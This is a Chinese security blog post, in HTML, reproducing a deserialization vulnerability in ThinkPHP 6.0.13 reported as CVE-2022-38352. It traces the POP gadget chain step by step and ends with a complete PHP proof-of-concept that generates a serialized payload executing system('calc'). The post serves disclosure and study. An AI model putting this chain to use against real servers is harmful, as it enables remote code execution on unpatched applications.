@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+<script>
+(function(){
+    if(''){
+        if (prompt('请输入文章密码') !== ''){
+            alert('密码错误！');
+            history.back();
+        }
+    }
+})();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/aixin.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/aixin.png">
+  <link rel="mask-icon" href="/images/aixin.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
+  <script src="true"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideLeftIn"}},"path":"search.xml"};
+  </script>
+
+
+
+<script>
+(function(){
+var src = "https://s.ssl.qhres2.com/ssl/ab77b6ea7f3fbf79.js";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+
+
+
+
+<!-- title、keywords、desc关键字 -->
+
+  <title>留言板</title>
+  <meta name="title" content="留言板" />
+
+
+
+
+
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="tp6.0.13反序列化漏洞">
+<meta property="og:url" content="https://hzy2003628.top/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="风尘孤狼">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291721537.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291723732.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291732893.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240835652.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240831420.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240840748.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240842688.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240845313.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240846128.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240847710.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240849698.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240856931.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240857830.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240901602.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240903509.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240905976.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240907710.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912197.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912795.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913643.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913939.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240915851.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291744161.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291751851.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291753462.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291754640.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291756893.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291807760.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291811169.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291812279.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291813136.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827393.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827252.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291819220.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240829084.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291820117.png?x-oss-process=hzy">
+<meta property="article:published_time" content="2022-09-29T14:39:55.000Z">
+<meta property="article:modified_time" content="2022-11-17T08:53:29.132Z">
+<meta property="article:author" content="故里">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291721537.png?x-oss-process=hzy">
+
+<link rel="canonical" href="https://hzy2003628.top/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>tp6.0.13反序列化漏洞 | 风尘孤狼</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1ea9671a278a2cb33e24c76d08af22f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">风尘孤狼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">知识型学习记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">92</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="故里">
+      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风尘孤狼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          tp6.0.13反序列化漏洞
+        </h1>
+
+        <div class="post-meta">  
+		 
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-29 22:39:55" itemprop="dateCreated datePublished" datetime="2022-09-29T22:39:55+08:00">2022-09-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-17 16:53:29" itemprop="dateModified" datetime="2022-11-17T16:53:29+08:00">2022-11-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/" class="post-meta-item leancloud_visitors" data-flag-title="tp6.0.13反序列化漏洞" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291721537.png?x-oss-process=hzy" alt="image-20220929172159440"></p>
+<span id="more"></span>
+<h1 id="环境配置">环境配置</h1>
+<pre><code class="hljs plaintext">composer create-project topthink/think tp6</code></pre>
+<p>搭建本地环境(apache+mysql+ftp),这里需要注意php版本要求7.1+</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291723732.png?x-oss-process=hzy" alt="image-20220929172326625"></p>
+<h1 id="漏洞挖掘">漏洞挖掘</h1>
+<p>对于php反序列化漏洞出发点几乎都是从魔法函数走起，__destruct魔法函数极为常见，这次也是通过这个开始</p>
+<p>用的是ps【phpstorm64】，ctrl+shift+f全局搜索__destruct</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291732893.png?x-oss-process=hzy" alt="image-20220929173226822"></p>
+<p>其他的也都大致看了看暂时感觉没啥用，抓住这个看一下，这个可以看到this-&gt;lazySave属于可控变量，跟进save方法</p>
+<blockquote>
+<p>/vendor/topthink/think-orm/src/Model.php</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240835652.png?x-oss-process=hzy" alt="image-20221024083511569"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240831420.png?x-oss-process=hzy" alt="image-20221024083156322"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240840748.png?x-oss-process=hzy" alt="image-20221024084029662"></p>
+<p>这里我们需要让下面这个if语句不成立，执行这个语句</p>
+<blockquote>
+<p>if ($this-&gt;isEmpty() || false === $this-&gt;trigger(‘BeforeWrite’))</p>
+</blockquote>
+<pre><code class="hljs plaintext">$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code></pre>
+<p>首先先看看isEmpty方法，跟进一下看看</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240842688.png?x-oss-process=hzy" alt="image-20221024084240619"></p>
+<p>不难发现，this-&gt;data这又是一个可控变量，只需要满足data[]不为空就会返回false</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240845313.png?x-oss-process=hzy" alt="image-20221024084518255"></p>
+<p>然后继续看第二个，跟进trigger()方法</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240846128.png?x-oss-process=hzy" alt="image-20221024084647049"></p>
+<p>可以发现又是个可控变量$this-&gt;withiEvent</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240847710.png?x-oss-process=hzy" alt="image-20221024084727647"></p>
+<p>设置withEvent为false，取反之后就是true就会返回true，所以此if语句两个都不成立，就会跳过判断进入想要进入的那个语句</p>
+<p>这个语句中exists属于可控变量</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240849698.png?x-oss-process=hzy" alt="image-20221024084917641"></p>
+<p>跟进updateData方法</p>
+<p>有点长，粘下来吧</p>
+<pre><code class="hljs plaintext">protected function updateData(): bool
+&#123;
+    // 事件回调
+    if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123;
+        return false;
+    &#125;
+
+    $this-&gt;checkData();
+
+    // 获取有更新的数据
+    $data = $this-&gt;getChangedData();
+
+    if (empty($data)) &#123;
+        // 关联更新
+        if (!empty($this-&gt;relationWrite)) &#123;
+            $this-&gt;autoRelationUpdate();
+        &#125;
+
+        return true;
+    &#125;
+
+    if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime) &#123;
+        // 自动写入更新时间
+        $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp();
+        $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
+    &#125;
+
+    // 检查允许字段
+    $allowFields = $this-&gt;checkAllowFields();
+
+    foreach ($this-&gt;relationWrite as $name =&gt; $val) &#123;
+        if (!is_array($val)) &#123;
+            continue;
+        &#125;
+
+        foreach ($val as $key) &#123;
+            if (isset($data[$key])) &#123;
+                unset($data[$key]);
+            &#125;
+        &#125;
+    &#125;
+
+    // 模型更新
+    $db = $this-&gt;db();
+
+    $db-&gt;transaction(function () use ($data, $allowFields, $db) &#123;
+        $this-&gt;key = null;
+        $where     = $this-&gt;getWhere();
+
+        $result = $db-&gt;where($where)
+            -&gt;strict(false)
+            -&gt;cache(true)
+            -&gt;setOption(&#x27;key&#x27;, $this-&gt;key)
+            -&gt;field($allowFields)
+            -&gt;update($data);
+
+        $this-&gt;checkResult($result);
+
+        // 关联更新
+        if (!empty($this-&gt;relationWrite)) &#123;
+            $this-&gt;autoRelationUpdate();
+        &#125;
+    &#125;);
+
+    // 更新回调
+    $this-&gt;trigger(&#x27;AfterUpdate&#x27;);
+
+    return true;
+&#125;</code></pre>
+<p>这里首先trigger可控，又checkdata方法又没定义，都可以跳过</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240856931.png?x-oss-process=hzy" alt="image-20221024085632858"></p>
+<p>直接跟进getChangeData方法</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240857830.png?x-oss-process=hzy" alt="image-20221024085709754"></p>
+<p>$this-&gt;force可控，为true时就会返回$this-&gt;data，所以也就是$data=$this-&gt;data</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240901602.png?x-oss-process=hzy" alt="image-20221024090149531"></p>
+<p>这里我们想进入到checkAllowFields方法需要让上面的if语句不成立</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240903509.png?x-oss-process=hzy" alt="image-20221024090359381"></p>
+<p>简单来说也就是让$data是否为空，这里若为空，就可以不进入if语句，执行到checkAllowFields()</p>
+<p>继续跟进到checkAllowFields()</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240905976.png?x-oss-process=hzy" alt="image-20221024090524878"></p>
+<p>这里刚开始的两个变量field和schema都是可控变量，构造为空时就可以进入db方法</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240907710.png?x-oss-process=hzy" alt="image-20221024090714634"></p>
+<p>不难发现这里就会触发_tostring魔法函数，这里的点起到了字符串拼接作用</p>
+<p>综上这一部分的pop链子就是这样的</p>
+<pre><code class="hljs plaintext">__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()
+
+
+$this-&gt;exists = true;
+$this-&gt;$withEvent = false;
+$this-&gt;$lazySave = true;</code></pre>
+<p>然后后面就是之前的老链子了，tp5的链子</p>
+<p>出发点是这个</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912197.png?x-oss-process=hzy" alt="image-20221024091215116"></p>
+<p>跟进toJson方法</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912795.png?x-oss-process=hzy" alt="image-20221024091242743"></p>
+<p>继续跟进toArray方法</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913643.png?x-oss-process=hzy" alt="image-20221024091310560"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913939.png?x-oss-process=hzy" alt="image-20221024091347858"></p>
+<p>在下面这里这个关键函数</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240915851.png?x-oss-process=hzy" alt="image-20221024091510752"></p>
+<p>触发他的条件是</p>
+<pre><code class="hljs plaintext">this−&gt;visible[key]存在，即this-&gt;visible存在键名为key的键，而k e y 则 来 源 于 data的键名，data则来源于this-&gt;data，也就是说this−&gt;data和this-&gt;visible要有相同的键名$key</code></pre>
+<p>继续跟进getAttr方法，在这里不难发现，这个地方对于$this-&gt;pool-&gt;getItem($this-&gt;key);调用的同时也触发了__call魔法函数</p>
+<p>这个getltem方法在Cgabbel对象中又不存在，所以调用之前会先构造</p>
+<blockquote>
+<p>__call () 用于<strong>当调用一个对象存在的方法时自动调用</strong>。</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291744161.png?x-oss-process=hzy" alt="image-20220929174443097"></p>
+<p>__call函数调用了log函数之后又去调用record函数</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291751851.png?x-oss-process=hzy" alt="image-20220929175149787"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291753462.png?x-oss-process=hzy" alt="image-20220929175325385"></p>
+<p>继续跟进record函数，继续跟进save函数</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291754640.png?x-oss-process=hzy" alt="image-20220929175451565"></p>
+<p>继续调用save函数</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291756893.png?x-oss-process=hzy" alt="image-20220929175617821"></p>
+<p>跟进去</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291807760.png?x-oss-process=hzy" alt="image-20220929180741660"></p>
+<p>这个request类中url会进行解析</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291811169.png?x-oss-process=hzy" alt="image-20220929181132100"></p>
+<p>跟进invoke函数</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291812279.png?x-oss-process=hzy" alt="image-20220929181247208"></p>
+<p>跟进invokeMethod</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291813136.png?x-oss-process=hzy" alt="image-20220929181355062"></p>
+<p>至此链子已经很清晰了，现在构建反序列化入口</p>
+<blockquote>
+<p>需要编写一个控制器模块并存在反序列化可控点得以利用此链条</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827393.png?x-oss-process=hzy" alt="image-20221024082721287"></p>
+<p>访问该路由，传参测试</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827252.png?x-oss-process=hzy" alt="image-20221024082751179"></p>
+<p>入口点构造成功，下面开始写入poc</p>
+<p>最后回到eval函数即可执行RCE</p>
+<p>poc如下</p>
+<pre><code class="hljs plaintext">&lt;?php
+
+namespace League\Flysystem\Cached\Storage&#123;
+
+    class Psr6Cache&#123;
+        private $pool;
+        protected $autosave = false;
+        public function __construct($exp)
+        &#123;
+            $this-&gt;pool = $exp;
+        &#125;
+    &#125;
+&#125;
+
+namespace think\log&#123;
+    class Channel&#123;
+        protected $logger;
+        protected $lazy = true;
+
+        public function __construct($exp)
+        &#123;
+            $this-&gt;logger = $exp; 
+            $this-&gt;lazy = false;
+        &#125;
+    &#125;
+&#125;
+
+namespace think&#123;
+    class Request&#123;
+        protected $url;
+        public function __construct()
+        &#123;
+            $this-&gt;url = &#x27;&lt;?php system(\&#x27;calc\&#x27;); exit(); ?&gt;&#x27;;
+        &#125;
+    &#125;
+    class App&#123;
+        protected $instances = [];
+        public function __construct()
+        &#123;
+            $this-&gt;instances = [&#x27;think\Request&#x27;=&gt;new Request()];
+        &#125;
+    &#125;
+&#125;
+
+namespace think\view\driver&#123;
+    class Php&#123;&#125;
+&#125;
+
+namespace think\log\driver&#123;
+
+    class Socket&#123;
+        protected $config = [];
+        protected $app;
+        protected $clientArg = [];
+
+        public function __construct()
+        &#123;
+            
+            $this-&gt;config = [
+                &#x27;debug&#x27;=&gt;true,
+                &#x27;force_client_ids&#x27; =&gt; 1,
+                &#x27;allow_client_ids&#x27; =&gt; &#x27;&#x27;,
+                &#x27;format_head&#x27; =&gt; [new \think\view\driver\Php,&#x27;display&#x27;], # 利用类和方法
+            ];
+            $this-&gt;app = new \think\App();
+            $this-&gt;clientArg = [&#x27;tabid&#x27;=&gt;&#x27;1&#x27;];
+        &#125;
+    &#125;
+&#125;
+
+namespace&#123;
+    $c = new think\log\driver\Socket();
+    $b = new think\log\Channel($c);
+    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
+    echo urlencode(serialize($a));
+&#125;</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291819220.png?x-oss-process=hzy" alt="image-20220929181920152"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240829084.png?x-oss-process=hzy" alt="image-20221024082945940"></p>
+<h1 id="后言">后言</h1>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291820117.png?x-oss-process=hzy" alt="image-20220929182059025"></p>
+<p>已提交CVE，编号CVE-2022-38352</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/issues/2749">https://github.com/top-think/framework/issues/2749</a></p>
+<p>浅浅总结一下，找洞的秘诀是细心！耐心！</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="故里 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/zhifubao.jpg" alt="故里 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>故里
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzy2003628.top/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/" title="tp6.0.13反序列化漏洞">https://hzy2003628.top/2022/09/29/tp6漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
